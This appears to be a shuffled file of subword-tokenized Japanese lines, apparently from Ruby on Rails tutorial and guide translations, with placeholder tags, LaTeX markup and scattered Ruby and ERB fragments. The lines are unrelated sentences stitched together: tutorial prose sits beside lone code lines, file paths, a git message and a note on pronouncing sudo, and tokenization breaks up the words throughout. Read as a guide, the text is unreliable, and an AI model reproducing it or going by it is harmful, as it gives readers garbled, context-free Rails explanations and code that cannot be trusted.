▁ 何らかの 変更 を行う 際に は 、 常に 「\ emph { 自動化 テスト }」 を作成して 、 機能 が正しく 実装 された ことを確認する 習慣 を ぜ ひ 身 に 付け ましょう 。
▁ 満 足 の ゆ く 解 が でき たら 、 リモート リポジトリ に プッシュ しても よいでしょう ▁( リモート リポジトリ がある場合 ) 。
▁# ▁gem ▁' guard - s p or k ', ▁' 1 ▖ 5▖0 '
▁今度は \ k ode { i } の代わりに \ k ode { number } を使用して いることにご注目ください ▟ この 変数 ▁( ブロック 変数 ) ▁ の名前 は 固定 されていません 。
▁ デバッグ 出力 を き れ い に 整 形 するために 、 {0}{1} 第 5 章 {/1}{/0} で作成した カスタム スタイルシート を リスト { p 1 } のように 追加します 。
▁ ユーザー登録フォーム を 動 か す ために 、 まず リスト \ ref { code : first _ create _ action } に ように コード を追加する ところから始め ます 。
▁### ▁` deep _ dup `
▁この \ k ode { user \_ params } メソッドは Users コントローラの 内部で のみ 実行 され 、 Web 経由で 外部 ユーザーに さ ら される 必要はない ため 、 リスト \ ref { code : create _ action _ strong _ parameters } に示すように Ruby の \ k ode { private } キーワード を使って \ k ode { 外部 から 使用 できない } ようにします
▁この 他にも 、 リレーション に対して さまざまな フ ァ イン ダ メソッドを使用して 複雑な 計算 を 行なうことができます 。
▁これは 、 HTTP 標準 では 技術 的に リダイレクト 後に フル URL が 要求 される ためです ▟ ただし 、 ほとんどの ブラウザで は どちらの 方法 でも 動作します 。
▁ 読んで 字 の ご と く 、\ k ode { first } は 単 に データベース の最初の ユーザー を返します 。
▁### ▁config / initializers / session _ store ▖ rb
▁**` : batch _ size ` **
▁ この後 で説明します が 、 この 方法 では た ち ま ち 壁 に 突 き 当 た ってしまいます ▟ これ を解決する ための \ k ode { has \_ many ▁through } ▁( 多 対 多 の関係 を表す の に 使用 ) ▁ についても この後 で説明します 。
▁ デフォルトの Rails フル スタック を使用している場合 、 実際に 経験 する 振る舞い に対して しか 関 心 が 持 て ない ものです 。
▁**` ActionDispatch :: Callbacks ` **
▁create ▁app / views / blorgh / articles / show ▖ html ▖ erb
▁ どの くらい 細 か く テスト するか は お 任 せ します ▟ ▁リスト \ ref { code : flash _ test } に 最小限 の テンプレート を用意し て お いた ので 、 参考にしてください ▁( ヒント : ▁\ k ode { FILL \_ IN } メソッドを 適切な コード に置き換える と 完成 します ) 。
▁<%= ▁yield ▁%>
▁リスト { p 0} の パーシャル を使用して 、 {2} new ▖ html ▖ erb {/2} ビュー と {2} edit ▖ html ▖ erb {/2} ビューを リファクタリング し 、 コードの 重複 を 取り 除 い てください 。
▁ ph y s ic i an ▖ patients ▁= ▁ patients
▁def ▁create
▁\ k ode { rails } コマンドで 作成される デフォルトの \ k ode { ▖ gitignore } ファイル の内容 。
▁{0} 図 8 ▖ 12 {/0} ▁{1} " remember _ token " ▁ チェックボックス を追加した login フォーム {/1}
▁#### ▁` video _ tag ` を使用して ビデオ にリンクする
▁ コントローラ については {0} 第 {1} 2 {/1} 章 {/0} でも 簡単に触れ ましたが 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / Re presentational _ State _ Transfer } { 第 {1} 6 {/1} 章 } で説明する {3} REST ▁ アーキテクチャ {/3} を 読む と 理解 が 深 まり ます ▟ 一 言 で言う と 、 コントローラと は ▁( 基本的に 動的な ) ▁Web ページの 集合 を 束 ね る コンテナ の ことです 。
▁Action ▁Mailer では テキスト メール と HTML メールを 両方 利用できる 。
▁X ▁= ▁1
▁ 実は 、 ハッシュ が 関数 呼び出し の \ emph { 最後の } 引数 である 場合は 、 波 かっこ を省略 できます ▟ 以下の 2 つの 行 は 同等です 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ 本ガイド の 手順 に従う ことで 、` blog ` という名前の 非常に シンプルな ブログ の Rails プロジェクト を作成 できます 。
▁ 語 源 学 の 示す ところ に よ れば ▁“ S O O - d oo ” ▁ と発音します が ▁( “ do ” ▁ は ▁“ d oo ” ▁ と 発 音 する ので ) 、 “ S O O - do h ” ▁という 発 音 も よく使われます 。
▁\ ref { sec : the _ finished _ signup _ form } でも 使用 しました 。
▁Rails ▁4▖0 以降 では 、 属性 を検索する 場合には 上の メソッド に代えて より 普 遍 性 の高い \ k ode { find _ by } メソッド を使用すること が 推 奨 されています ▟ このメソッド では 属性を ハッシュ 形式で 渡します 。
▁ 具体的には 、 Home ページ と Help ページ 、 About ページ で使用する アクションを 作 って みます 。
▁\ k ode { default \_ scope } で で マイクロポストを 順序 付ける
▁HTML ▁ shim は 、 それ だけで 3 行 も 占 有 し 、 風 変 わ り な IE 特有の 文法 を使用している ので 、 これを うまく 隠 す ことができ たら どんな に よいでしょう 。
▁ここで ひとつ 注意 し なければならない のは 、` default _ scope ` を ` scope ` や ` where ` 条件 よりも 前 に置い ている という 点 です 。
▁ ユーザーが すぐ クリック できるように 、 ユーザー登録ページ のリンク を追加して ある ことにご注目ください 。
▁* ▁` image - path (" rails ▖ png ") ` は ` " / assets / rails ▖ png " ` に変換 される
▁end
▁ 安全 な 文字列 に対して ` dup ` または ` clone ` を実行し た場合 は 、 安全 な 文字列 が生成されます 。
▁* ▁` find _ last _ by _▖▖▖` ▁ に代えて ▁` where (▖▖▖) ▖ last ` ▁ を使用
▁self を省略した 結果を リスト \ ref { code : generated _ user _ mailer _ preview s } に示します 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } では 、 より 実 践 的な 知識 を 身につけ るために 、 Scaffold と ほぼ 逆 の アプローチ で 開発 を 進 め ていきます ▟ 具体的には 、 {1} {2} 第 2 章 {/2}{/1} で 作成する 簡単な デ モ アプリ では scaffold を使います が 、\ emph { この チュートリアル } の 中 核 である {3} {2} 第 3 章 以降 {/2} {/3} の サンプルアプリケーション から は 、 scaffold を 一 切 使 わ ずに 開発 を 進 め ていきます 。
▁つまり 、\ k ode { user _ id } は \ k ode { attr _ accessible } リスト から 削除 される べ き であり 、 また そう する ことにより 上 記 のコードは テスト に 失敗します 。
▁ 以下のように 、\ k ode { page } は テストの \ emph { 主 題 ▁( subject ) ▁ } であること を RSpec に 伝える ことにより 、 冗 長 の 原 因 を 排 除 できます 。
▁self ▖ author ▁= ▁Blorgh ▖ author _ class ▖ constantize ▖ find _ or _ create _ by ( name : ▁author _ name )
▁ な ぜ 失敗 している のでしょうか ▟ ヒント は error _ messages パーシャル の 他の 出 現 場所 です ▟ この パーシャル は 他の 場所 でも 使われ ていた ため 、 ユーザー登録 ▁( リスト \ ref { code : f _ error _ messages }) 、 パスワード 再設定 ▁( リスト \ ref { code : password _ reset _ form }) 、 そして ユーザー 編集 ▁( リスト \ ref { code : user _ edit _ view }) ▁ の それぞれの ビューを 更新 する必要が あった のです 。
▁` to _ xml ` メソッドは 、 レシーバ を XML 表現 に変換 した もの を含む 文字列 を返します 。
▁ ルーティング メソッド である ` delete ` は 、 リソース を削除する ときに 使用 する必要があります 。
▁\ ref { sec : a _ user _ class } では 、 オブジェクトの 属性 を設定する ための \ emph { 初期化 ハッシュ ▁( hash ) ▁ } を 引数に 取 るように 、 User クラス の例 ▁( user \_ example ▖ rb ) ▁ を 設計 しました ▟ この 設計 は 、 同様の方法で オブジェクトを 初期化 する Active ▁Record の 設計 に基づいて います 。
▁self を省略した 結果を リスト \ ref { code : comment _ out _ footer } に示します 。
▁ サイト デザイン も 操作 法 も 一 貫 していません 。
▁リスト { p 0} で {2} create {/2} アクションを 定義 できたので 、\ ref { code : login _ form } で定義した ログインフォーム も 正常に 動作する ようになった はずです 。
▁` return ` を使用した い のであれば 、 明示的に メソッド を定義する ことが 推 奨 されます 。
▁#### # ▁` utc ?
▁╼╼ ▁% ▁section ▁introduction ▁( end )╼╼ ▁\ section { さ っ そ く 動 か す } ▁% ▁( fold )╼ ▁\ label { sec : up _ and _ running }╼╼
▁ 具体的には 、\ emph { user @ example , com } のような 無効な メールアドレスが 弾 か れ ること と 、\ emph { user @ example ▖ com } のような 有効なメールアドレス が 通 る ことを確認 しながら 、 バリデーション を実装 していきます
▁ 読者 が Rails の 経験 がない ことを 前提と しています 。
▁S w it ch ed ▁to ▁a ▁new ▁branch ▁' modify - README '
▁ Contribut or ▖ limit (2) ▖ order (: rank )▖ to _ xml ( skip _ type s : ▁true )
▁before フィルター の コメントアウト を 元に戻 して 、 ▁\ passing ▁ になる かどうか 確かめ てみましょう ▁( リスト \ ref { code : un comment ed _ before _ filter }) 。
